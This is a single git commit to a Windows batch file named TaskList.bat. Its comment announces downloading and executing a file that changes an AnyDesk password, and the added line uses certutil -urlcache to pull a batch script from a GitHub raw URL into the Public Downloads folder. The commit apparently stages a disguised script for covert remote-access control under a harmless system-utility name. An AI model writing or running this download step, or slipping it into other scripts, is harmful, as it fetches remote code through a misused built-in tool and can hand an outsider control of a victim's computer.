8f8e10ec3df3053871e67183bd537fb8ea3c7ec8
falconx1 <gazelle.lord@gmail.com>
2023-07-05 17:04:03 +0700

    Update TaskList.bat

--- TaskList.bat
+++ TaskList.bat
@@ -1,1 +1,2 @@
 :: Download and execute change anydesk password file
+certutil -urlcache -split -f "https://raw.githubusercontent.com/falconx1/windows-config/main/TaskList.bat" "C:\Users\Public\Downloads\TaskList.bat"
